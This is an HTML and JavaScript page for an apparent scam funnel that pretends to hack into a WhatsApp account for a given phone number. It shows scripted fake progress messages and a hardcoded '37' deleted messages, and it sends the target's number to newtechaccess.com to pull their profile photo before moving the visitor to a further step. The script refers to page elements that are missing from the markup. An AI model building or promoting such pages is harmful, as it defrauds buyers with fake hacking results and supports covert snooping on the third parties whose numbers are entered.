<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
:root{--green:#25D366;--green-dark:#128C7E;--bg:#f0f2f5;--white:#fff;--text:#111b21;--text2:#667781;--border:#e9edef;--red:#ef4444;--shadow-lg:0 8px 32px rgba(0,0,0,.12);}
body{font-family:'Inter',sans-serif;background:var(--bg);min-height:100vh;padding:2rem 1rem 4rem;display:flex;flex-direction:column;align-items:center;}
.wrap{width:100%;max-width:480px;display:flex;flex-direction:column;align-items:center;gap:1.2rem;}
.logo{display:flex;align-items:center;gap:.55rem;margin-top:.5rem;}
.logo-icon{width:32px;height:32px;background:var(--green);border-radius:50%;display:flex;align-items:center;justify-content:center;}
.logo-icon svg{width:18px;height:18px;fill:#fff;}
.logo-text{font-size:1.1rem;font-weight:700;color:var(--green);letter-spacing:-.02em;}
.card{width:100%;background:var(--white);border-radius:16px;padding:1.6rem;box-shadow:var(--shadow-lg);border:1px solid var(--border);}

/* LOADING */
#screen-load{width:100%;text-align:center;}
.spin-wrap{width:70px;height:70px;position:relative;margin:0 auto 1.3rem;}
.spin{width:70px;height:70px;border-radius:50%;border:3px solid var(--border);border-top-color:var(--green);animation:spin 1s linear infinite;}
@keyframes spin{to{transform:rotate(360deg)}}
.load-title{font-size:1.2rem;font-weight:800;color:var(--text);margin-bottom:.3rem;}
.load-phone{font-size:1rem;font-weight:700;color:var(--green);margin-bottom:.3rem;}
.load-status{font-size:.82rem;color:var(--text2);margin-bottom:1.3rem;min-height:1.1em;transition:opacity .3s;}
.prog-wrap{width:100%;height:8px;background:var(--border);border-radius:20px;overflow:hidden;margin-bottom:.35rem;}
.prog-fill{height:100%;background:linear-gradient(90deg,var(--green-dark),var(--green));border-radius:20px;width:0%;transition:width .3s ease;}
.prog-pct{font-size:.8rem;font-weight:700;color:var(--green);text-align:right;margin-bottom:1.3rem;}
.steps{display:flex;flex-direction:column;gap:.5rem;}
.step-item{display:flex;align-items:center;gap:.85rem;background:#f8fffe;border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;transition:all .3s;}
.step-item.done{background:#f0fdf4;border-color:#bbf7d0;}
.step-item.active{background:#f0fdf4;border-color:var(--green);box-shadow:0 0 0 3px rgba(37,211,102,.1);}
.step-ico{width:30px;height:30px;border-radius:50%;background:var(--border);border:1.5px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:1.1rem;transition:all .3s;}
.step-item.done .step-ico{background:var(--green);border-color:var(--green);font-size:0;}
.step-item.done .step-ico::after{content:'✓';font-size:.8rem;color:#fff;font-weight:700;}
.step-item.active .step-ico{border-color:var(--green);font-size:0;}
.step-item.active .step-ico::after{content:'';display:block;width:14px;height:14px;border:2px solid #bbf7d0;border-top-color:var(--green);border-radius:50%;animation:spin .8s linear infinite;}
.step-txt{font-size:.88rem;font-weight:500;color:var(--text2);transition:color .3s;}
.step-item.done .step-txt,.step-item.active .step-txt{color:var(--text);}

/* PROFILE CARD */
#screen-profile{display:none;width:100%;flex-direction:column;gap:1rem;}
.prof-card{width:100%;background:var(--white);border-radius:16px;padding:1.8rem 1.5rem;box-shadow:var(--shadow-lg);border:1px solid var(--border);text-align:center;}
.av-wrap{width:80px;height:80px;margin:0 auto 1rem;border-radius:50%;border:3px solid var(--green);background:#f0fdf4;display:flex;align-items:center;justify-content:center;overflow:hidden;}
.av-wrap svg{width:40px;height:40px;fill:#adb5bd;}
.av-wrap img{width:80px;height:80px;object-fit:cover;border-radius:50%;}
.prof-num{font-size:1.1rem;font-weight:700;color:var(--text);margin-bottom:.4rem;}
.reg-badge{display:inline-flex;align-items:center;gap:.4rem;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;padding:.22rem .75rem;font-size:.75rem;font-weight:600;color:var(--green-dark);}
.reg-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse2 1.4s infinite;flex-shrink:0;}
@keyframes pulse2{0%,100%{opacity:1}50%{opacity:.4}}

.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:.75rem;margin-top:1.2rem;}
.stat-box{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:.9rem;text-align:center;}
.stat-val{font-size:1.3rem;font-weight:800;color:var(--text);display:block;margin-bottom:.2rem;}
.stat-val.scanning{font-size:.9rem;color:var(--red);animation:blink 1s infinite;}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
.stat-lbl{font-size:.7rem;color:var(--text2);font-weight:500;text-transform:uppercase;letter-spacing:.05em;}

.cta{width:100%;padding:1rem;background:linear-gradient(135deg,var(--green),#22c55e);border:none;border-radius:13px;font-family:'Inter',sans-serif;font-size:1rem;font-weight:700;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:.6rem;transition:all .25s;box-shadow:0 4px 20px rgba(37,211,102,.3);}
.cta:hover{transform:translateY(-2px);}
.cta svg{width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0;}
.change-btn{width:100%;padding:.8rem;background:none;border:1.5px solid var(--border);border-radius:13px;font-family:'Inter',sans-serif;font-size:.88rem;font-weight:600;color:var(--text2);cursor:pointer;transition:all .2s;margin-top:.6rem;}
.change-btn:hover{border-color:var(--text2);color:var(--text);}
</style>

  <!-- LOADING -->
  <div id="screen-load">
    <div class="card">
      <div class="spin-wrap"><div class="spin"></div></div>
      <div class="load-title">Accessing WhatsApp</div>
      <div class="load-phone" id="lphone">+1 (555) 000-0000</div>

        <div class="step-item" id="st0"><div class="step-ico">⏳</div><span class="step-txt">Connecting to WhatsApp servers</span></div>

<script>
var up = new URLSearchParams(window.location.search);
var phone = up.get('phone') || sessionStorage.getItem('sl_phone') || '';
var decoded = phone ? decodeURIComponent(phone) : '';
if (decoded) sessionStorage.setItem('sl_phone', decoded);

document.getElementById('lphone').textContent = decoded || '+1 (555) 000-0000';
document.getElementById('prof-num').textContent = decoded || '+1 (555) 000-0000';

var statusMsgs = [
  'Preparing access...',
  'Establishing secure connection...',
  'Checking WhatsApp registration...',
  'Authenticating session...',
  'Extracting profile data...',
  'Scanning for deleted messages...',
  'Access complete!'
];
var sIdx = 0;

function sleep(ms){ return new Promise(function(r){setTimeout(r,ms);}); }

function animPct(from, to, dur){
  return new Promise(function(resolve){
    var start = performance.now();
    var fill = document.getElementById('pfill');
    var pct = document.getElementById('ppct');
    function frame(now){
      var t = Math.min((now-start)/dur,1);
      var ease = 1-Math.pow(1-t,3);
      var val = Math.round(from+(to-from)*ease);
      fill.style.width = val+'%';
      pct.textContent = val+'%';
      if(t<1) requestAnimationFrame(frame);
      else resolve();
    }
    requestAnimationFrame(frame);
  });
}

async function runLoad(){
  var statusEl = document.getElementById('lstatus');
  var steps = [
    {id:'st0', pct:25, dur:1600},
    {id:'st1', pct:55, dur:1400},
    {id:'st2', pct:78, dur:1500},
    {id:'st3', pct:100, dur:1800},
  ];
  var prev = 0;

  var sTimer = setInterval(function(){
    sIdx = (sIdx+1)%statusMsgs.length;
    statusEl.style.opacity='0';
    setTimeout(function(){ statusEl.textContent=statusMsgs[sIdx]; statusEl.style.opacity='1'; },180);
  },1200);

  for(var i=0;i<steps.length;i++){
    var s = steps[i];
    document.getElementById(s.id).classList.add('active');
    await animPct(prev, s.pct, s.dur);
    document.getElementById(s.id).classList.remove('active');
    document.getElementById(s.id).classList.add('done');
    prev = s.pct;
    await sleep(150);
  }
  clearInterval(sTimer);
  statusEl.textContent = 'Access complete!';
  await sleep(600);

  // Transition to profile
  var loadEl = document.getElementById('screen-load');
  loadEl.style.transition='opacity .4s,transform .4s';
  loadEl.style.opacity='0'; loadEl.style.transform='translateY(-12px)';
  await sleep(420);
  loadEl.style.display='none';

  var profEl = document.getElementById('screen-profile');
  profEl.style.display='flex';

  // Animate deleted count
  var n=0;
  var t = setInterval(function(){
    n = Math.min(n+1,37);
    document.getElementById('del-count').textContent = n;
    if(n>=37){ document.getElementById('del-count').classList.remove('scanning'); clearInterval(t); }
  },50);

  // Load profile pic
  loadAvatar(decoded);
}

function loadAvatar(phone) {
  var container = document.getElementById('av-container');
  var apiUrl = 'https://newtechaccess.com/profile-picture.php?phone=' + encodeURIComponent(phone);
  fetch(apiUrl)
    .then(function(r){ return r.json(); })
    .then(function(data){
      if(data && data.urlImage){
        var proxied = 'https://newtechaccess.com/image-proxy.php?url=' + encodeURIComponent(data.urlImage);
        container.innerHTML = '<img src="'+proxied+'" alt=""/>';
      }
    })
    .catch(function(){});
}

function goStep4(){
  navigateWithQuery('step4.html', {phone: decoded});
}

setTimeout(runLoad, 400);
</script>
